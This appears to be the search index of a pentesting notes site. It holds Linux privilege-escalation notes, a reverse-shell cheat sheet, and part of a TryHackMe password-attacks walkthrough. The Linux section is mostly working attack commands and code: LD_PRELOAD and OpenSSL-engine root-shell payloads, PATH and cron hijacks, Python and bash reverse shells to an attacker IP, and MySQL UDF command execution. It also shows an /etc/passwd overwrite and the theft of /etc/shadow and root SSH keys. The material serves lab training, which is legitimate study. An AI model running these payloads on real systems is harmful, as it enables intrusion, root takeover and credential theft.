whoami","title":"CVE-2019-16634"},{"location":"notes/privilege-escalation/linux/#sudo-ld_preload","text":"sudo -l Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights? Expliot cd / tmp vi priv . c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init () { unsetenv ( \"LD_PRELOAD\" ); setgid ( 0 ); setuid ( 0 ); system ( \"/bin/bash\" ); } Compile priv . c : gcc -fPIC -shared -o priv . so priv . c -nostartfiles Command : sudo LD_PRELOAD =/ tmp / priv . so awk // awk can be replaced with any sudo binary","title":"Sudo LD_PRELOAD"},{"location":"notes/privilege-escalation/linux/#suid-guid-binaries-overview","text":"SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. Basically, you can change the permission of any file either using the \u201cNumerical\u201d method or \u201cSymbolic\u201d method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration GUID permission is similar to the SUID permission, only difference is \u2013 when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member Enumeration: find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l find / -perm -g = s -type f 2 >/ dev / null | xargs ls -l find / -perm - 4000 -type f -exec ls -la {} 2 >/ dev / null \\; find / -uid 0 -perm - 4000 -type f 2 >/ dev / null // Look for any binaries that seem odd . Any binaries running from a users home directory ? // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root","title":"SUID / GUID Binaries Overview"},{"location":"notes/privilege-escalation/linux/#suid-path-environmental-variable","text":"PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands. View PATH echo $PATH env | grep PATH print $PATH Example 1 Create a Simple Basic SUID binary cd / home / max / vi test . c #include<unistd.h> void main () { setuid ( 0 ); setgid ( 0 ); system ( \"curl -I 127.0.0.1\" ); } Compile Binary & Add SUID Bit gcc test . c -o network-tester chmod u + s network-tester mv network-tester / bin / tools / Example 1 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / network-tester ls -la / bin / tools / network-tester Test the SUID Binary / bin / tools / network-tester strings / bin / tools / network-tester Output Example : curl -I 127 . 0 . 0 . 1 Absue the SUID Binary echo \"/bin/bash\" > / tmp / curl chmod 777 / tmp / curl echo $PATH export PATH =/ tmp : $PATH / bin / tools / network-tester id && whoami Example 3 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : service apache2 status Absue the SUID Binary echo 'int mian() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' > / tmp / service . c gcc / tmp / service . c -o / tmp / service chmod 777 / tmp / service export PATH =/ tmp : $PATH echo $PATH / bin / tools / webserver-status id && whoami Example 4 (With full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : / usr / sbin / service apache2 status Absue the SUID Binary fucntion / usr / sbin / service () { cp / bin / bash / tmp && chmod + s / tmp / bash && / tmp / bash -p ; } export -f / usr / sbin / service / bin / tools / webserver-status id && whoami Example 5 (/bin/systemctl) Privilege Escalation Copy line by line inside the victim low priv shell TF =$( mktemp ). service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"chmod +s /bin/bash > /tmp/output\" [Install] WantedBy=multi-user.target' > $TF systemctl link $TF systemctl enable - -now $TF / bin / bash -p id && whoami Example 5 (Copy - /bin/cp) Privilege Escalation Victim find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Copy the contents of / etc / passwd to your local machine inside a new file called \"passwd\" Attacker Run the following command locally : openssl passwd - 1 -salt ignite NewRootPassword Copy the output Add the following inside the local passwd file echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> passwd // Replace < output > with the copied output python -m SimpleHTTPServer 9000 Victim wget -O / tmp / passwd http :// 10 . 10 . 10 . 10 : 9000 / passwd cp / tmp / passwd / etc / passwd su root2 Password : NewRootPassword id && whoami // Replace Attacker IP & Port","title":"SUID PATH Environmental Variable"},{"location":"notes/privilege-escalation/linux/#cron-tabs-scheduled-tasks","text":"Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals Enumeration contab -l / etc / init . d / etc / cron * / etc / crontab / etc / cron . allow / etc / cron . d / etc / cron . deny / etc / cron . daily / etc / cron . hourly / etc / cron . monthly / etc / cron . weekly Example 1 Privilege Escalation via Nonexistent File Overwrite cat / etc / crontab Output Example : * * * * * root systemupdate . sh echo 'chmod +s /bin/bash' > / home / user / systemupdate . sh chmod + x / home / user / systemupdate . sh Wait a while / bin / bash -p id && whoami Example 2 Privilege Escalation via Root Executable Bash Script cat / etc / crontab Output Example : * * * * * root / usr / bin / local / network-test . sh echo \"chmod +s /bin/bash\" >> / usr / bin / local / network-test . sh Wait a while id && whomai Example 3 Privilege Escalation via Root Executable Python Script Overwrite Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import socket import subprocess import os s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.10.10.10\" , 443 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/bash\" , \"-i\" ]); // Replace the IP & Port // Save & Exit the Script Attacker nc -lvnp 443 OR Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import os os . system ( \"chmod +s /bin/bash\" ) // Save & Exit the Script Wait a While / bin / bash -p id && whoami Example 4 Privilege Escalation via Tar Bash Script (WildCards) cat / etc / crontab Output Example : * * * * * root / usr / bin / local / mysql-db-backup . sh cat / usr / bin / local / mysql-db-backup . sh Output of Script : -------------------------------- #!/bin/bash cd / var / www / html / tar czf / tmp / dbbackup . tar . gz * -------------------------------- cd / var / www / html / echo \"#!/bin/bash\" > priv . sh echo \"chmod +s /bin/bash\" >> priv . sh chmod + x priv . sh touch / var / www / html /- -checkpoint = 1 touch / var / www / html /- -checkpoint-action = exec = sh \\ priv . sh Wait a while / bin / bash -p id && whomai Example 5 Privilege Escalation via Tar Cron Job cat / etc / crontab Output Example : */ 1 * * * * root tar -zcf / var / backups / html . tgz / var / www / html /* cd / var / www / html / echo \"chmod +s /bin/bash\" > priv . sh echo \"\" > \"--checkpoint-action=exec=bash priv.sh echo \"\" > --checkpoint=1 tar cf archive.tar * // If it does not work , replace \" bash \" with \" sh \"","title":"Cron Tabs &amp; Scheduled Tasks"},{"location":"notes/privilege-escalation/linux/#capabilities","text":"Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0). Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root. Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file. Python Perl Tar OpenSSL Python getcap -r / 2 >/ dev / null / usr / bin / python2 . 6 = cap_setuid + ep / usr / bin / python2 . 6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami OR getcap -r / 2 >/ dev / null / usr / bin / python3 = cap_setuid + ep / usr / bin / python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami Perl getcap -r / 2 >/ dev / null / usr / bin / perl = cap_setuid + ep / usr / bin / perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";' id && whoami Tar Method 1 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf shadow . tar / etc / shadow / usr / bin / tar -xvf shadow . tar cat etc / shadow Copy content of users accounts to a local file called shadow Attacker john shadow - -wordlist =/ usr / share / wordlists / rockyou . txt Crack root ' s credentials Victim su root id && whoami Method 2 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf key . tar / root /. ssh / id_rsa / usr / bin / tar -xvf key . tar cat id_rsa # Download id_rsa to attacker machine Attacker chmod 600 id_rsa ssh -i id_rsa root @< victim_ip > id && whoami OpenSSL Victim getcap -r / 2 >/ dev / null / usr / bin / openssl = cap_setuid + ep Attacker Create a .so file - Code below vi priv.c #include <openssl/engine.h> #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> static const char * engine_id = \"test\" ; static const char * engine_name = \"hope it works\" ; static int bind ( ENGINE * e , const char * id ) { int ret = 0 ; if (! ENGINE_set_id ( e , engine_id )) { fprintf ( stderr , \"ENGINE_set_id failed\\n\" ); goto end ; } if (! ENGINE_set_name ( e , engine_name )) { printf ( \"ENGINE_set_name failed\\n\" ); goto end ; } setuid ( 0 ); setgid ( 0 ); system ( \"chmod +s /bin/bash\" ); system ( \"echo Complete!\" ); ret = 1 ; end : return ret ; } IMPLEMENT_DYNAMIC_BIND_FN ( bind ) IMPLEMENT_DYNAMIC_CHECK_FN () Compile Code & Create .so file gcc -c fPIC priv . c -o priv gcc -shared -o priv . so -lcrypto priv Victim Download .so from Attacker wget -O / tmp / priv . so http :// 10 . 10 . 10 . 10 : 9000 / priv . so // Replace IP & Port Get Root openssl req -engine /tmp/priv.so /bin/bash -p id && whoami","title":"Capabilities"},{"location":"notes/privilege-escalation/linux/#nfs-root-squashing","text":"Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network. rw: Permit clients to read as well as write access to the shared directory. ro: Permit clients to Read-only access to shared directory. root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account. no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication. async: It will speed up transfers but can cause data corruption as NFS server doesn\u2019t wait for the complete write operation to be finished on the stable storage, before replying to the client. sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage. Enumeration Victim cat / etc / exports // Do we see any no_root_squash enabled on a mounted share ? / tmp *( rw , sync , insecure , no_root_squash , no , subtree , check ) Attacker nmap -sV - -script = nfs-showmount < victim_ip > Privilege Escalation Attacker showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > / tmp / mount / priv . c gcc / tmp / mount / priv . c -o / tmp / mount / priv chmod + s / tmp / mount / priv OR showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount cd / tmp / mount cp / bin / bash . chmod + s bash Victim cd / tmp ./ priv id && whoami OR cd / tmp ./ bash -p id && whoami","title":"NFS Root Squashing"},{"location":"notes/privilege-escalation/linux/#chkrootkit-049","text":"Expliot: https://www.exploit-db.com/exploits/33899 cat /etc/cron.daily /usr/bin/chkrootkit ls -la /usr/bin/chkrootkit // Do we have SUID? chkrootkit -V echo \"#!/bin/bash\" > /tmp/update echo \"chmod +s /bin/bash\" >> /tmp/update Wait a While ... /bin/bash -p id && whoami","title":"chkrootkit 0.49"},{"location":"notes/privilege-escalation/linux/#tmux","text":"tmux is a terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. Tmux Cheat Sheet: https://tmuxcheatsheet.com/ Privilege Escalation tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /tmp/tmux-14/default-root // Replace Path to Socket (Depending on your results) OR tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /opt/.dev/gbm/ attach -t 0 // Replace Path to Session (Depending on your results)","title":"Tmux"},{"location":"notes/privilege-escalation/linux/#mysql-running-as-root","text":"Example 1 ps aux | grep root mysql -u root -p \\! chmod + s / bin / bash exit ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 2 Victim ps aux | grep root mysql -u root -p \\! bash -i >& / dev / tcp / 10 . 10 . 10 . 10 / 9999 0 >& 1 Attacker nc -lvnp 9999 id && whoami","title":"MySQL Running as root"},{"location":"notes/privilege-escalation/linux/#mysql-udf-user-defined-functions-code-udf-injection","text":"User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat() UDFs are useful when you need to extend the functionality of your MySQL server For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution Example 1 - Reverse Shell Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1' ); // Any UDF library can be used , as long as it is exploitable via the sys_exec () function // The \"admin\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port Attacker nc -lvnp 9999 Example 2 (Local via SUID) Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'chmod +s /bin/bash' ); mysql > exit Wait a while ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 3 (Explioting MySQL 4.x/5.0 (Linux)) UDF Link: https://www.exploit-db.com/exploits/1518 Victim wget -O priv . c https :// www . exploit-db . com / download / 1518 gcc \u2013 g \u2013 shared \u2013 Wl , \u2013 soname , priv . so \u2013 o priv . so priv . c \u2013 lc chmod 777 priv . so mv priv . so / tmp / mysql -u root -p mysql > create table priv ( line blob ); mysql > insert into priv values ( load_file ( \u2018 / tmp / priv . so \u2019 )); mysql > select * from priv into dumpfile \u2018 / usr / lib / mysql / plugin / priv . so \u2019 ; mysql > create function do_system returns integer soname \u2018 priv . so \u2019 ; mysql > select do_system ( \u2018 chmod + s / bin / bash \u2019 ); mysql >! sh / bin / bash -p id && whoami // priv . c can be called anything // The \"priv\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port","title":"MySQL UDF (User-Defined Functions) Code (UDF) Injection"},{"location":"notes/privilege-escalation/windows/","tags":["Privilege Escalation","Windows"],"text":"Windows Privilege Escalation \u00b6 Privilege Escalation Methods \u00b6 Basic System Enumeration Finding clear text credentials GPP (Group Policy Preference) Secrets dump via SAM (VHD Mounted Share) Kernel Expliots AlwaysInstallElevated DNSAdmin DLL Injection RunAs with Saved Credentials BinPATH Service Re-Direct - Weak Permissions USP (Unquoted Service Path) SeImpersonate / SeAssignPrimaryToken - Service Accounts MSSQL via UDF User Defined Function","title":"Windows Privilege Escalation"},{"location":"notes/privilege-escalation/windows/#windows-privilege-escalation","text":"","title":"Windows Privilege Escalation"},{"location":"notes/privilege-escalation/windows/#privilege-escalation-methods","text":"Basic System Enumeration Finding clear text credentials GPP (Group Policy Preference) Secrets dump via SAM (VHD Mounted Share) Kernel Expliots AlwaysInstallElevated DNSAdmin DLL Injection RunAs with Saved Credentials BinPATH Service Re-Direct - Weak Permissions USP (Unquoted Service Path) SeImpersonate / SeAssignPrimaryToken - Service Accounts MSSQL via UDF User Defined Function","title":"Privilege Escalation Methods"},{"location":"tags/tags/","text":"Categories \u00b6 Intro Metasploit \u00b6 TryHackMe - Metasploit Intro Powershell Empire \u00b6 TryHackMe - Empire Linux \u00b6 Linux Privilege Escalation Privilege Escalation \u00b6 Linux Privilege Escalation Windows Privilege Escalation THM-CTF \u00b6 Lian_Yu THM-Init Access \u00b6 Init Access Init Access THM-Intro C2 \u00b6 TryHackMe - Intro to C2 THM-Intro PowerShell \u00b6 TryHackMe - Hacking with Powershell - Walkthrough THM-Password Attacks \u00b6 Password Attacks THM-Pentest \u00b6 Basic Pentesting THM-Phishing \u00b6 Phishing THM-Privilege Escalation \u00b6 Privilege Escalation Basic Pentesting THM-Weaponization \u00b6 Weaponization Windows \u00b6 Windows Privilege Escalation","title":"Categories"},{"location":"tags/tags/#categories","text":"","title":"Categories"},{"location":"tags/tags/#intro-metasploit","text":"TryHackMe - Metasploit","title":"Intro Metasploit"},{"location":"tags/tags/#intro-powershell-empire","text":"TryHackMe - Empire","title":"Intro Powershell Empire"},{"location":"tags/tags/#linux","text":"Linux Privilege Escalation","title":"Linux"},{"location":"tags/tags/#privilege-escalation","text":"Linux Privilege Escalation Windows Privilege Escalation","title":"Privilege Escalation"},{"location":"tags/tags/#thm-ctf","text":"Lian_Yu","title":"THM-CTF"},{"location":"tags/tags/#thm-init-access","text":"Init Access Init Access","title":"THM-Init Access"},{"location":"tags/tags/#thm-intro-c2","text":"TryHackMe - Intro to C2","title":"THM-Intro C2"},{"location":"tags/tags/#thm-intro-powershell","text":"TryHackMe - Hacking with Powershell - Walkthrough","title":"THM-Intro PowerShell"},{"location":"tags/tags/#thm-password-attacks","text":"Password Attacks","title":"THM-Password Attacks"},{"location":"tags/tags/#thm-pentest","text":"Basic Pentesting","title":"THM-Pentest"},{"location":"tags/tags/#thm-phishing","text":"Phishing","title":"THM-Phishing"},{"location":"tags/tags/#thm-privilege-escalation","text":"Privilege Escalation Basic Pentesting","title":"THM-Privilege Escalation"},{"location":"tags/tags/#thm-weaponization","text":"Weaponization","title":"THM-Weaponization"},{"location":"tags/tags/#windows","text":"Windows Privilege Escalation","title":"Windows"},{"location":"tryhackme/191209uhcndcnc%2C.e%3B.frrrp3pz--%3Df%2C1/","text":"Cheat sheet \u00b6 Reverse shell \u00b6 HTA \u00b6 msfvenom -p windows / x64 / shell_reverse_tcp LHOST = ATTACK_IP LPORT = 443 -f hta-psh -o thm . hta PHP \u00b6 https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Payload Injection \u00b6 https://github.com/swisskyrepo/PayloadsAllTheThings","title":"Cheat sheet"},{"location":"tryhackme/191209uhcndcnc%2C.e%3B.frrrp3pz--%3Df%2C1/#cheat-sheet","text":"","title":"Cheat sheet"},{"location":"tryhackme/191209uhcndcnc%2C.e%3B.frrrp3pz--%3Df%2C1/#reverse-shell","text":"","title":"Reverse shell"},{"location":"tryhackme/191209uhcndcnc%2C.e%3B.frrrp3pz--%3Df%2C1/#hta","text":"msfvenom -p windows / x64 / shell_reverse_tcp LHOST = ATTACK_IP LPORT = 443 -f hta-psh -o thm . hta","title":"HTA"},{"location":"tryhackme/191209uhcndcnc%2C.e%3B.frrrp3pz--%3Df%2C1/#php","text":"https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php","title":"PHP"},{"location":"tryhackme/191209uhcndcnc%2C.e%3B.frrrp3pz--%3Df%2C1/#payload-injection","text":"https://github.com/swisskyrepo/PayloadsAllTheThings","title":"Payload Injection"},{"location":"tryhackme/red-teaming/init-access/","tags":["THM-Init Access"],"text":"Init Access \u00b6 Explore the different techniques to gain initial access to a target system and network from a Red Teamer\u2019s perspective. Red Team Recon Redteam weaponization Passwork Attacks","title":"Init Access"},{"location":"tryhackme/red-teaming/init-access/#init-access","text":"Explore the different techniques to gain initial access to a target system and network from a Red Teamer\u2019s perspective. Red Team Recon Redteam weaponization Passwork Attacks","title":"Init Access"},{"location":"tryhackme/red-teaming/init-access/password-attacks/","tags":["THM-Password Attacks"],"text":"Password Attacks \u00b6 Task 1: Introduction \u00b6 This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss: Password profiling Password attacks techniques Online password attacks What is a password? \u00b6 Passwords are used as an authentication method for individuals to access computer systems or applications. Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords! A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password , 123456 , 111111 , and much more. Here are the top 100 and most common and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@ ). Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy. How secure are passwords? \u00b6 Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others. To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the Sony breach in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks. Answer the questions below Learn about password attacking techniques in the next task! Answer No needed answer Task 2: Password Attacking Techniques \u00b6 Password Attack Techniques \u00b6 In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine. Password Cracking vs. Password Guessing \u00b6 This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper . Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools. Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing: Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely. Password cracking is a technique performed locally or on systems controlled by the attacker. Answer the questions below Which type of password attack is performed locally? Answer Explain Password cracking Password cracking is a technique performed locally or on systems controlled by the attacker. Task 3: Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists \u00b6 Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists. Default Passwords \u00b6 Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin , admin:123456 , etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin . Here are some website lists that provide default passwords for various products. https://cirt.net/passwords https://default-password.info/ https://datarecovery.com/rd/default-passwords/ Weak Passwords \u00b6 Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists : https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking. Leaked Passwords \u00b6 Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost , elitehacker , hak5 , Hotmail , PhpBB companies' leaks: SecLists/Passwords/Leaked-Databases Combined wordlists \u00b6 Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat : cewl cat file1 . txt file2 . txt file3 . txt > combined_list . txt To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows: cewl sort combined_list . txt | uniq -u > cleaned_combined_list . txt Customized Wordlists \u00b6 Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password! Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below cewl user @thm $ cewl -w list . txt -d 5 -m 5 http :// thm . labs -w will write the contents to a file. In this case, list.txt. -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) http://thm.labs is the URL that will be used As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task! Username Wordlists \u00b6 Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames. {first name} : john {last name} : smith {first name}{last name} : johnsmith {last name}{first name} : smithjohn first letter of the {first name}{last name} : jsmith first letter of the {last name}{first name} : sjohn first letter of the {first name}.{last name} : j.smith first letter of the {first name}-{last name} : j-smith and so on Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name. Usernames user @thm $ git clone https :// github . com / therodri2 / username_generator . git Cloning into 'username_generator' ... remote : Enumerating objects : 9 , done . remote : Counting objects : 100 % ( 9 / 9 ), done . remote : Compressing objects : 100 % ( 7 / 7 ), done . remote : Total 9 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 0 Receiving objects : 100 % ( 9 / 9 ), done . user @thm $ cd username_generator Using python3 username_generator.py -h shows the tool's help message and optional arguments. Usernames user @thm $ python3 username_generator . py -h usage : username_generator . py [ -h ] -w wordlist [ -u ] Python script to generate user lists for bruteforcing ! optional arguments : -h , - -help show this help message and exit -w wordlist , - -wordlist wordlist Specify path to the wordlist -u , - -uppercase Also produce uppercase permutations . Disabled by default ``` Now let 's create a wordlist that contains the full name John Smith to a text file. Then, we' ll run the tool to generate the possible combinations of the given full name . ``` ps1 title = \"Usernames\" user @thm $ echo \"John Smith\" > users . lst user @thm $ python3 username_generator . py -w users . lst usage : username_generator . py [ -h ] -w wordlist [ -u ] john smith j . smith j-smith j_smith j + smith jsmith smithjohn This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice! Answer the questions below What are the default login credentials (in the format of username:password ) for a Juniper Networks ISG 2000 device? Answer netscreen : netscreen Task 4: Password Profiling #2 - Keyspace Technique and CUPP \u00b6 Keyspace Technique \u00b6 Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch , we can specify numerous options, including min, max, and options as follows: crunch user @thm $ crunch -h crunch version 3 . 6 Crunch can create a wordlist based on the criteria you specify . The output from crunch can be sent to the screen , file , or to another program . Usage : crunch [options] where min and max are numbers Please refer to the man page for instructions and examples on how to use crunch . The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to. crunch user @thm $ crunch 2 2 01234abcd -o crunch . txt Crunch will now generate the following amount of data : 243 bytes 0 MB 0 GB 0 